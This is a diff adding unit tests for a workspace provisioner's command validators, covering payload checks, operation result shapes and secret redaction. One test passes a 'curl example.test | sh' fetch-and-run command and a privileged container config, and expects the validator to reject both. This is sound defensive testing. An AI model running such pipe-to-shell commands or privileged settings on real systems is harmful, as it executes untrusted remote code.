@@ -152,6 +152,75 @@ describe("provisioner contract validators", () => {
     });
   });
 
+  it("rejects unsupported raw payload fields for all command types", () => {
+    expect(
+      validateProvisionerCommand({
+        ...baseCommand,
+        type: "CreateWorkspace",
+        payload: {
+          templateVersion: "prototype",
+          resourceProfileId: "local-dev",
+          autoStart: true,
+          rawIncusConfig: { "security.privileged": true },
+        },
+      }),
+    ).toMatchObject({
+      ok: false,
+      error: { code: "invalid_input" },
+    });
+    expect(
+      validateProvisionerCommand({
+        ...baseCommand,
+        type: "GetWorkspaceStatus",
+        payload: { incusProject: "user-abc123" },
+      }),
+    ).toMatchObject({
+      ok: false,
+      error: { code: "invalid_input" },
+    });
+    expect(
+      validateProvisionerCommand({
+        ...baseCommand,
+        type: "RunSetup",
+        payload: {
+          skipAptScripts: true,
+          command: "curl example.test | sh",
+        },
+      }),
+    ).toMatchObject({
+      ok: false,
+      error: { code: "invalid_input" },
+    });
+  });
+
+  it("accepts valid command payloads for lifecycle command envelopes", () => {
+    expect(
+      validateProvisionerCommand({
+        ...baseCommand,
+        type: "CreateWorkspace",
+        payload: {
+          templateVersion: "prototype",
+          resourceProfileId: "local-dev",
+          autoStart: false,
+        },
+      }).ok,
+    ).toBe(true);
+    expect(
+      validateProvisionerCommand({
+        ...baseCommand,
+        type: "StopWorkspace",
+        payload: { force: false, timeoutSeconds: 180 },
+      }).ok,
+    ).toBe(true);
+    expect(
+      validateProvisionerCommand({
+        ...baseCommand,
+        type: "RestartWorkspace",
+        payload: { timeoutSeconds: 180 },
+      }).ok,
+    ).toBe(true);
+  });
+
   it("rejects age key persistence unless policy enables it", () => {
     const payload: RunSetupPayload = {
       ageKey: {
@@ -236,6 +305,47 @@ describe("provisioner contract validators", () => {
     });
   });
 
+  it("validates non-status operation result shapes by command type", () => {
+    expect(
+      validateProvisionerOperation(
+        {
+          id: "op-1",
+          requestId: "req-123",
+          type: "CreateWorkspace",
+          workspaceId: "workspace-1",
+          status: "succeeded",
+          result: {
+            workspaceId: "workspace-1",
+            incusProject: "user-abc123",
+            incusContainer: "ws-def456",
+            state: "running",
+            templateVersion: "prototype",
+            resourceProfileId: "local-dev",
+          },
+        },
+        baseCommand.workspace,
+        "CreateWorkspace",
+      ).ok,
+    ).toBe(true);
+    expect(
+      validateProvisionerOperation(
+        {
+          id: "op-1",
+          requestId: "req-123",
+          type: "RunSetup",
+          workspaceId: "workspace-1",
+          status: "succeeded",
+          result: {
+            workspaceId: "workspace-1",
+            setup: { phase: "ready" },
+          },
+        },
+        baseCommand.workspace,
+        "RunSetup",
+      ).ok,
+    ).toBe(true);
+  });
+
   it("redacts age key material from commands", () => {
     const command: ProvisionerCommand<RunSetupPayload> = {
       ...baseCommand,
@@ -289,5 +399,6 @@ describe("provisioner contract validators", () => {
     expect(
       redactSetupExcerpt("raw /home/agent path AGE-SECRET-KEY-super-secret"),
     ).toBe("raw [REDACTED_PATH] path [REDACTED_AGE_KEY]");
+    expect(redactSetupExcerpt("x".repeat(5000))).toContain("[TRUNCATED]");
   });
 });
